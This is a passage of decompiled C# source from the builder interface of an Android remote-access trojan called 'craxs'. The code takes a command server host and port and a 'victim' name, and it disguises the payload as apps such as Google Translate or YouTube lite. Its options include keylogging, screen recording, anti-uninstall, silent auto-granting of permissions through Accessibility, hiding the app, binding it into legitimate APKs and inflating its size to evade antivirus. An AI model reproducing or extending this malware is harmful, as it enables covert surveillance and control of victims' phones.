			if (!string.IsNullOrEmpty(this.TextNamePatch.Text))
			{
				this.Textfakename.Text = this.TextNamePatch.Text;
			}
			EagleAlert.Showinformation("in order to make anti-delete work well , use same app name from page 1 (info)");
		}
		else
		{
			this.fakepanel.Enabled = true;
			this.Textfakename.Text = "";
		}
	}

	// Token: 0x06000231 RID: 561 RVA: 0x0004460C File Offset: 0x0004280C
	private void Button2_Click(object sender, EventArgs e)
	{
		this.TextPackage.Text = string.Concat(new string[]
		{
			this.randmid[this.rnd.Next(0, this.randmid.Length)],
			".",
			this.randmid[this.rnd.Next(0, this.randmid.Length)],
			".",
			this.randmid[this.rnd.Next(0, this.randmid.Length)]
		});
	}

	// Token: 0x06000232 RID: 562 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000233 RID: 563 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000234 RID: 564 RVA: 0x0004469C File Offset: 0x0004289C
	private void TextBox2_TextChanged(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.TextSize.Text))
		{
			EagleAlert.Showinformation("Only Enter Numbers");
			this.TextSize.Text = "30";
		}
	}

	// Token: 0x06000235 RID: 565 RVA: 0x000024E4 File Offset: 0x000006E4
	private void Button3_Click(object sender, EventArgs e)
	{
		this.logtitletext.Text = "Accessibility Service";
		this.logbodytext.Text = "This App Request Accessibility Service:\r\n• Click on Enable\r\n• Go to Downloaded Service\r\n• Enable [MY-NAME]";
		this.logbtntext.Text = "Enable";
	}

	// Token: 0x06000236 RID: 566 RVA: 0x000446D8 File Offset: 0x000428D8
	private void Panel3_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (this.RectInputText1.Count > 0)
		{
			foreach (Rectangle rect in this.RectInputText1)
			{
				if (rect.Width > 0)
				{
					e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), rect);
				}
			}
		}
		Color color = Color.FromArgb(150, (int)SpySettings.DefaultColor_Foreground.R, (int)SpySettings.DefaultColor_Foreground.G, (int)SpySettings.DefaultColor_Foreground.B);
		Pen pen = new Pen(color, 1f);
		Rectangle rect2 = checked(new Rectangle(0, 0, this.Panel3.Width - 1, this.Panel3.Height - 1));
		e.Graphics.DrawRectangle(pen, rect2);
	}

	// Token: 0x06000237 RID: 567 RVA: 0x000447D8 File Offset: 0x000429D8
	private void CheckAllPrims_CheckedChanged(object sender, EventArgs e)
	{
		if (this.CheckAllPrims.Checked)
		{
			using (IEnumerator enumerator = this.comboproms.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					this.Primslist.Items.Add(RuntimeHelpers.GetObjectValue(objectValue));
				}
				return;
			}
		}
		this.Primslist.Items.Clear();
	}

	// Token: 0x06000238 RID: 568 RVA: 0x0000206C File Offset: 0x0000026C
	private void Addactiv_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000239 RID: 569 RVA: 0x0000206C File Offset: 0x0000026C
	private void Removeactiv_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600023A RID: 570 RVA: 0x0004486C File Offset: 0x00042A6C
	private void Label33_MouseEnter(object sender, EventArgs e)
	{
		string text = "1- only request file manager permission while installing apk\r\n2- you can request permissions Later from Manager > Permissions\r\n3- if this option enabled super mod will be ignored\r\n4- Better with draw over apps";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600023B RID: 571 RVA: 0x00002516 File Offset: 0x00000716
	private void Label33_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600023C RID: 572 RVA: 0x000448E4 File Offset: 0x00042AE4
	private void Label35_MouseEnter(object sender, EventArgs e)
	{
		string text = "this permission is required only if super mod is off";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600023D RID: 573 RVA: 0x00002516 File Offset: 0x00000716
	private void Label35_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600023E RID: 574 RVA: 0x0004495C File Offset: 0x00042B5C
	private void CheckQuick_CheckedChanged(object sender, EventArgs e)
	{
		if (this.CheckQuick.Checked)
		{
			this.CheckRecord.Checked = true;
			this.CheckRecord.Refresh();
			this.checkkeyloger.Checked = true;
			this.checkkeyloger.Refresh();
			this.CheckDraw.Checked = true;
			this.CheckDraw.Refresh();
		}
	}

	// Token: 0x0600023F RID: 575 RVA: 0x000449BC File Offset: 0x00042BBC
	private void Button4_Click(object sender, EventArgs e)
	{
		if (this.numberrandomer == null)
		{
			this.numberrandomer = new Random();
		}
		this.TextVersion.Text = string.Concat(new string[]
		{
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString()
		});
	}

	// Token: 0x06000240 RID: 576 RVA: 0x00044A7C File Offset: 0x00042C7C
	private void CheckQuick_CheckedChanged(object sender, MouseEventArgs e)
	{
		this.explaintoolstext.Text = "";
		if (this.Checksuper.Checked)
		{
			Codes.MyMsgBox("info", "this option can't be used with Super Mod", false, Resources.information48px);
			this.CheckQuick.Checked = false;
		}
	}

	// Token: 0x06000241 RID: 577 RVA: 0x00044AC8 File Offset: 0x00042CC8
	private void Label14_MouseEnter(object sender, EventArgs e)
	{
		string text = "if client is not connected , save the keystrokes on the phone , you can check this keystrokes using keylogger monitor";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000242 RID: 578 RVA: 0x00002516 File Offset: 0x00000716
	private void Label14_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000243 RID: 579 RVA: 0x00044B40 File Offset: 0x00042D40
	private void Label16_MouseEnter(object sender, EventArgs e)
	{
		string text = "make the app only run on real phones , and block emulators";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000244 RID: 580 RVA: 0x00044BB8 File Offset: 0x00042DB8
	private void Delayaccesstext_TextChanged(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.TextSize.Text))
		{
			EagleAlert.Showinformation("Only Enter Numbers");
			this.TextSize.Text = "15";
		}
	}

	// Token: 0x06000245 RID: 581 RVA: 0x00044BF4 File Offset: 0x00042DF4
	private void Label6_MouseEnter(object sender, EventArgs e)
	{
		string text = "Request Accessibility services , which Allows ( anti delete + control screen + auto granting permissions + screen Reader + and more ...)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000246 RID: 582 RVA: 0x00002516 File Offset: 0x00000716
	private void Label6_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000247 RID: 583 RVA: 0x00044C6C File Offset: 0x00042E6C
	private void Label34_MouseEnter(object sender, EventArgs e)
	{
		string text = "some phones such as oppo,vivo,huawei , request special permission called auto start , to keeps the app running in background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000248 RID: 584 RVA: 0x00002516 File Offset: 0x00000716
	private void Label34_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000249 RID: 585 RVA: 0x00044CE4 File Offset: 0x00042EE4
	private void Label38_MouseEnter(object sender, EventArgs e)
	{
		string text = "if supre mod enable the app will automatically click allow on all permissions , this options hide phone screen while granting";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600024A RID: 586 RVA: 0x00002516 File Offset: 0x00000716
	private void Label38_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600024B RID: 587 RVA: 0x00044D5C File Offset: 0x00042F5C
	private void Label41_MouseEnter(object sender, EventArgs e)
	{
		string text = "prevent phone from going into sleep mod , to keep connection open for long time";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600024C RID: 588 RVA: 0x00002516 File Offset: 0x00000716
	private void Label41_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600024D RID: 589 RVA: 0x00044DD4 File Offset: 0x00042FD4
	private void Label17_MouseEnter(object sender, EventArgs e)
	{
		string text = "This option will take another apk and merge it with craxs apk\r\nand when craxs apk is installed, it will pop up a new window to install the merged app\r\nif the merged app get removed , the craxs app stay";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600024E RID: 590 RVA: 0x00002516 File Offset: 0x00000716
	private void Label17_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600024F RID: 591 RVA: 0x00044E4C File Offset: 0x0004304C
	private void Label10_MouseEnter(object sender, EventArgs e)
	{
		string text = "if the meraged app is already installed on the phone craxs app will not show install page\r\ninstead it will open the installed app directly";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000250 RID: 592 RVA: 0x00002516 File Offset: 0x00000716
	private void Label10_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000251 RID: 593 RVA: 0x00044EC4 File Offset: 0x000430C4
	private void TextPackage_TextChanged_1(object sender, EventArgs e)
	{
		string text = this.TextPackage.Text.Trim();
		if (this.Package_keyback && !text.Contains("."))
		{
			int selectionStart = this.TextPackage.SelectionStart;
			text = text.Insert(selectionStart, ".");
			this.TextPackage.Text = text;
			try
			{
				this.TextPackage.SelectionStart = text.IndexOf(".");
			}
			catch (Exception)
			{
			}
		}
		checked
		{
			try
			{
				if (Versioned.IsNumeric(text[0].ToString()))
				{
					this.TextPackage.Text = text.Substring(1, text.Length - 1);
				}
			}
			catch (Exception)
			{
			}
			try
			{
				if (Versioned.IsNumeric(text[text.IndexOf(".") + 1].ToString()))
				{
					this.TextPackage.Text = this.TextPackage.Text.Replace("." + text[text.IndexOf(".") + 1].ToString(), ".");
					this.TextPackage.SelectionStart = text.IndexOf(".");
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000252 RID: 594 RVA: 0x00045028 File Offset: 0x00043228
	private void TextPackage_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Back)
		{
			this.Package_keyback = true;
		}
		else
		{
			this.Package_keyback = false;
		}
	}

	// Token: 0x06000253 RID: 595 RVA: 0x00045050 File Offset: 0x00043250
	private void TextPackage_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (this.TextPackage.SelectionLength != 0 && this.TextPackage.SelectedText.Contains("."))
		{
			this.TextPackage.DeselectAll();
			e.Handled = true;
		}
		else
		{
			string text = this.TextPackage.Text.Trim();
			string text2 = "qazwsxedcrfvtgbyhnujmikolp";
			string text3 = "1234567890qazwsxedcrfvtgbyhnujmikolp";
			if (text.EndsWith("."))
			{
				if (!text2.Contains(e.KeyChar.ToString().ToLower()) && !this.Package_keyback)
				{
					e.Handled = true;
				}
			}
			else if (!text3.Contains(e.KeyChar.ToString().ToLower()) && !this.Package_keyback)
			{
				e.Handled = true;
			}
		}
	}

	// Token: 0x06000254 RID: 596 RVA: 0x0004460C File Offset: 0x0004280C
	private void Randomidbtn_Click(object sender, EventArgs e)
	{
		this.TextPackage.Text = string.Concat(new string[]
		{
			this.randmid[this.rnd.Next(0, this.randmid.Length)],
			".",
			this.randmid[this.rnd.Next(0, this.randmid.Length)],
			".",
			this.randmid[this.rnd.Next(0, this.randmid.Length)]
		});
	}

	// Token: 0x06000255 RID: 597 RVA: 0x000449BC File Offset: 0x00042BBC
	private void Randomverbtn_Click(object sender, EventArgs e)
	{
		if (this.numberrandomer == null)
		{
			this.numberrandomer = new Random();
		}
		this.TextVersion.Text = string.Concat(new string[]
		{
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString(),
			".",
			this.numberrandomer.Next(1, 99).ToString()
		});
	}

	// Token: 0x06000256 RID: 598 RVA: 0x00045130 File Offset: 0x00043330
	private void Label21_MouseEnter(object sender, EventArgs e)
	{
		string text = "(CUSTOM) after the app is installed , it can work as real app using the provided website link , or you can use pre add templates\r\n(HIDDEN) the app  will hide it self from apps list , good with bind option\r\ntip: use same name and icon from first page (information)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainoptionstext.Text = text;
	}

	// Token: 0x06000257 RID: 599 RVA: 0x00002528 File Offset: 0x00000728
	private void Label21_MouseLeave(object sender, EventArgs e)
	{
		this.explainoptionstext.Text = "";
	}

	// Token: 0x06000258 RID: 600 RVA: 0x000451A8 File Offset: 0x000433A8
	private void Label12_MouseEnter(object sender, EventArgs e)
	{
		string text = "the app use sticky notification to keep the app running in background , if this option disabled the app may not keep running in background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainoptionstext.Text = text;
	}

	// Token: 0x06000259 RID: 601 RVA: 0x00002528 File Offset: 0x00000728
	private void Label12_MouseLeave(object sender, EventArgs e)
	{
		this.explainoptionstext.Text = "";
	}

	// Token: 0x0600025A RID: 602 RVA: 0x00045220 File Offset: 0x00043420
	private void Label13_MouseEnter(object sender, EventArgs e)
	{
		string text = "give the app more size , make it more realistic and believable , more size wont effect the app performance at all , also help bypass protection , as some antiviruses consider app with small size as suspicious app\r\ntip: dont use this option (keep it 1) if you use bind option in next page";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explainoptionstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainoptionstext.Text = text;
	}

	// Token: 0x0600025B RID: 603 RVA: 0x00002528 File Offset: 0x00000728
	private void Label13_MouseLeave(object sender, EventArgs e)
	{
		this.explainoptionstext.Text = "";
	}

	// Token: 0x0600025C RID: 604 RVA: 0x000447D8 File Offset: 0x000429D8
	private void CheckAllPrims_CheckedChanged(object sender, MouseEventArgs e)
	{
		if (this.CheckAllPrims.Checked)
		{
			using (IEnumerator enumerator = this.comboproms.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					this.Primslist.Items.Add(RuntimeHelpers.GetObjectValue(objectValue));
				}
				return;
			}
		}
		this.Primslist.Items.Clear();
	}

	// Token: 0x0600025D RID: 605 RVA: 0x00045298 File Offset: 0x00043498
	private void Button1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = reso.res_Path_iconsapps;
		openFileDialog.Title = "Selecte Fake App icon [Only .png] (.png)";
		openFileDialog.Filter = "png Files|*.png";
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			this.fakeiconpic.Image = null;
			this.FAKEAPPicon = "null";
		}
		else if (!this.IsPngImage(openFileDialog.FileName))
		{
			Codes.MyMsgBox("incorrect format", "Make sure the image/icon is formatted as PNG\r\nrenameing jpg to png does not work\r\ntry google: jpg to png", false, Resources.error48px);
		}
		else
		{
			this.FAKEAPPicon = openFileDialog.FileName;
			this.fakeiconpic.Image = Codes.ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(144, 144), false);
		}
	}

	// Token: 0x0600025E RID: 606 RVA: 0x00045358 File Offset: 0x00043558
	private void SelectedApk_Click_1(object sender, EventArgs e)
	{
		checked
		{
			if (string.IsNullOrEmpty(this.TextIP.Text) | string.IsNullOrEmpty(this.po.Text))
			{
				EagleAlert.Showinformation("Add (Host) + Port First");
			}
			else if (this.TextNameVictim.Text.Length == 0)
			{
				EagleAlert.Showinformation("name of victim empty");
			}
			else if (this.TextNamePatch.Text.Length == 0)
			{
				EagleAlert.Showinformation("name patch empty");
			}
			else if (this.TextVersion.Text.Length == 0)
			{
				EagleAlert.Showinformation("version empty");
			}
			else if (this.TextPackage.Text.Length == 0)
			{
				EagleAlert.Showinformation("Package Name empty");
			}
			else if (this.TextPackage.Text.Length == 0)
			{
				EagleAlert.Showinformation("Package Name empty");
			}
			else if (this.TextPackage.Text.Trim().StartsWith(".") | this.TextPackage.Text.Trim().EndsWith("."))
			{
				EagleAlert.Showinformation("Package segments must be of non-zero length");
			}
			else
			{
				if (this.CheckBIND.Checked)
				{
					if (!this.trgtbkg.Text.Contains("."))
					{
						EagleAlert.Showinformation("Recheck Targer Binded App Package Name");
						return;
					}
					this.TheTarget = this.trgtbkg.Text.ToLower();
				}
				else
				{
					this.TheTarget = "null";
				}
				if (this.CheckRecord.Checked)
				{
					this.UseRecorder = "YES";
				}
				this.LogB(this.MyStamp);
				Thread.Sleep(5000);
				string text = this.combotype.Text;
				string text2 = text;
				if (text2 != null)
				{
					switch (text2.Length)
					{
					case 6:
						if (text2 == "Custom")
						{
							this.THETYPE = "C";
							if (Operators.CompareString(this.FAKEAPPicon, "null", false) == 0)
							{
								EagleAlert.Showinformation("Select Custom App icon");
								return;
							}
							this.FAKEAPPNAME = this.Textfakename.Text;
							this.FAKEAPPlink = reso.ChekLink(this.Textfakelink.Text);
							goto IL_677;
						}
						break;
					case 9:
					{
						char c = text2[0];
						if (c != 'A')
						{
							if (c != 'P')
							{
								if (c == 'T')
								{
									if (text2 == "Temp Mail")
									{
										this.THETYPE = "C";
										this.FAKEAPPicon = reso.res_Path_iconsapps + "\\tempmailicon.png";
										this.iconPatch = this.FAKEAPPicon;
										this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
										this.FAKEAPPNAME = "Temp Mail";
										this.TextNamePatch.Text = "Temp Mail";
										this.FAKEAPPlink = reso.ChekLink("https://temp-mail.org");
										goto IL_677;
									}
								}
							}
							else if (text2 == "Proxy App")
							{
								this.THETYPE = "C";
								this.FAKEAPPicon = reso.res_Path_iconsapps + "\\knox.png";
								this.iconPatch = this.FAKEAPPicon;
								this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
								this.FAKEAPPNAME = "Filterbypass";
								this.TextNamePatch.Text = "Filterbypass";
								this.FAKEAPPlink = reso.ChekLink("https://www.filterbypass.me");
								goto IL_677;
							}
						}
						else if (text2 == "App Store")
						{
							this.THETYPE = "C";
							this.FAKEAPPicon = reso.res_Path_iconsapps + "\\appstore.png";
							this.iconPatch = this.FAKEAPPicon;
							this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
							this.FAKEAPPNAME = "APK DONE";
							this.TextNamePatch.Text = "APK DONE";
							this.FAKEAPPlink = reso.ChekLink("https://apkdone.com/");
							goto IL_677;
						}
						break;
					}
					case 10:
						if (text2 == "Hidden App")
						{
							this.THETYPE = "K";
							this.FAKEAPPNAME = this.TextNamePatch.Text;
							this.FAKEAPPlink = "";
							goto IL_677;
						}
						break;
					case 12:
						if (text2 == "Youtube lite")
						{
							this.THETYPE = "C";
							this.FAKEAPPicon = reso.res_Path_iconsapps + "\\ytlite.png";
							this.iconPatch = this.FAKEAPPicon;
							this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
							this.FAKEAPPNAME = "Youtube lite";
							this.TextNamePatch.Text = "Youtube lite";
							this.FAKEAPPlink = reso.ChekLink("https://www.youtube.com");
							goto IL_677;
						}
						break;
					case 14:
						if (text2 == "Wallpapers App")
						{
							this.THETYPE = "C";
							this.FAKEAPPicon = reso.res_Path_iconsapps + "\\artcanvas.png";
							this.iconPatch = this.FAKEAPPicon;
							this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
							this.FAKEAPPNAME = "Papers";
							this.TextNamePatch.Text = "Papers";
							this.FAKEAPPlink = reso.ChekLink("https://papers.co");
							goto IL_677;
						}
						break;
					case 16:
						if (text2 == "Google Translate")
						{
							this.THETYPE = "C";
							this.FAKEAPPicon = reso.res_Path_iconsapps + "\\gtrans.png";
							this.iconPatch = this.FAKEAPPicon;
							this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(this.FAKEAPPicon), new Size(144, 144), false);
							this.FAKEAPPNAME = "Google Translate";
							this.TextNamePatch.Text = "Google Translate";
							this.FAKEAPPlink = reso.ChekLink("https://translate.google.com");
							goto IL_677;
						}
						break;
					}
				}
				this.THETYPE = "T";
				IL_677:
				if (Operators.CompareString(this.combotype.Text, "Hidden App", false) == 0)
				{
					this.HIDETYPE = "TEN";
				}
				else
				{
					this.HIDETYPE = "ONE";
				}
				if (Operators.CompareString(this.checkver.Text, "V1", false) == 0)
				{
					this.APKVERSION = "22";
				}
				else
				{
					if (Operators.CompareString(this.checkver.Text, "V2", false) != 0)
					{
						this.LogB("No Ver Selected , Default : V2");
					}
					this.APKVERSION = "29";
				}
				if (this.tracklist.Items.Count > 0)
				{
					this.trackerlist = "";
					foreach (object value in this.tracklist.Items)
					{
						string str = Conversions.ToString(value);
						ref string ptr = ref this.trackerlist;
						ptr = ptr + str + ">";
					}
				}
				string text3 = null;
				string text4 = null;
				string text5 = null;
				text3 = text3 + this.TextIP.Text + ":";
				text4 = text4 + this.po.Text + ":";
				text3 = text3.Substring(0, text3.Length - 1);
				text4 = text4.Substring(0, text4.Length - 1);
				string text6 = this.TextNameVictim.Text;
				string text7 = this.TextNamePatch.Text;
				string text8 = this.TextVersion.Text;
				text5 += "1";
				if (this.CheckDoze.Checked)
				{
					if (this.Nottitle.Text.Length < 1)
					{
						this.NOTIFI_TITLE = " ";
					}
					else
					{
						this.NOTIFI_TITLE = this.Nottitle.Text;
					}
					if (this.Notmsg.Text.Length < 1)
					{
						this.NOTIFI_MSG = " ";
					}
					else
					{
						this.NOTIFI_MSG = this.Notmsg.Text;
					}
					text5 += "1";
				}
				else
				{
					this.NOTIFI_TITLE = " ";
					this.NOTIFI_MSG = " ";
					text5 += "0";
				}
				text5 = ((!this.CheckBIND.Checked) ? (text5 + "0") : (text5 + "1"));
				text5 += "0";
				text5 += "0";
				text5 += "0";
				text5 += "1";
				if (this.checkkeyloger.Checked)
				{
					this.OFFKEYLOG = "on";
				}
				else
				{
					this.OFFKEYLOG = this.Randomunicode(10, 15);
				}
				if (this.checkemo.Checked)
				{
					this.ANTIEMO = "NOEMO";
				}
				else
				{
					this.ANTIEMO = this.Randomunicode(10, 15);
				}
				if (this.CheckDoze.Checked)
				{
					this.isnotifi = "on";
					text5 += "1";
				}
				else
				{
					text5 += "0";
				}
				if (this.Checksuper.Checked)
				{
					this.isuper = "on";
				}
				if (this.uninstall.Checked)
				{
					this.anuninstall = "on";
				}
				if (this.CheckAOX.Checked)
				{
					this.isAOX = "on";
				}
				if (this.checkunlocker.Checked)
				{
					this.isautounlock = "on";
				}
				if (this.checknetwork.Checked)
				{
					this.isnetwork = "on";
				}
				if (this.checkcaptureonce.Checked)
				{
					this.iscaponce = "on";
				}
				if (this.CheckBIND.Checked)
				{
					this.isBind = "on";
				}
				if (this.CheckSkipre.Checked)
				{
					this.isskipreinstall = "on";
				}
				if (this.checkkeepsscreen.Checked)
				{
					this.iskeepscreen = "on";
				}
				if (this.CheckHidePrims.Checked)
				{
					this.isHideprims = "on";
				}
				if (this.checkadmin.Checked)
				{
					this.isadmin = "on";
				}
				if (this.checkautostart.Checked)
				{
					this.isautostart = "on";
				}
				if (this.CheckQuick.Checked)
				{
					this.isQuick = "on";
				}
				if (this.CheckDraw.Checked)
				{
					this.isDrawing = "on";
				}
				string text9 = Conversions.ToString(0);
				string text10 = "";
				string[] array = this.TextPackage.Text.Split(new char[]
				{
					'.'
				});
				string text11 = array[array.Length - 1];
				Color defaultColor_Background = SpySettings.DefaultColor_Background;
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				string text12 = string.Format("{0},{1},{2}|{3},{4},{5}", new object[]
				{
					defaultColor_Background.R,
					defaultColor_Background.G,
					defaultColor_Background.B,
					defaultColor_Foreground.R,
					defaultColor_Foreground.G,
					defaultColor_Foreground.B
				});
				string final = string.Concat(new string[]
				{
					text3,
					this.spl_arguments,
					text4,
					this.spl_arguments,
					text6,
					this.spl_arguments,
					text7,
					this.spl_arguments,
					text8,
					this.spl_arguments,
					text5,
					":",
					Data.password,
					this.spl_arguments,
					text9,
					this.spl_arguments,
					text10,
					this.spl_arguments,
					reso.res_Path,
					"\\Lib\\platformBinary.zip",
					this.spl_arguments,
					"null",
					this.spl_arguments,
					reso.res_Path,
					"\\Fonts\\",
					this.spl_arguments,
					text11,
					this.spl_arguments,
					text12,
					this.spl_arguments,
					this.iconPatch,
					this.spl_arguments,
					MySettingsProperty.Settings.FontStyle,
					this.spl_arguments,
					Conversions.ToString(MySettingsProperty.Settings.FontSize),
					this.spl_arguments,
					this.BIND_Path,
					this.spl_arguments,
					this.BIND_EX,
					this.spl_arguments,
					this.intent_,
					this.spl_arguments,
					this.TextPackage.Text
				});
				this.SelectedApk.Enabled = false;
				this.TABCTRL.Enabled = false;
				this.StartWork(final);
				this.saveAll();
			}
		}
	}

	// Token: 0x0600025F RID: 607 RVA: 0x000460CC File Offset: 0x000442CC
	private void Addactiv_Click_1(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text))
		{
			EagleAlert.Showinformation("Select Permission to Add");
		}
		else if (this.Primslist.Items.Contains(this.comboproms.Text))
		{
			EagleAlert.Showinformation("Permission Already Add");
		}
		else
		{
			this.Primslist.Items.Add(this.comboproms.Text);
		}
	}

	// Token: 0x06000260 RID: 608 RVA: 0x00046150 File Offset: 0x00044350
	private void Checkcatpure_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkcatpure.Checked)
		{
			this.checkcaptureonce.Enabled = true;
			this.panemnitor.Enabled = true;
		}
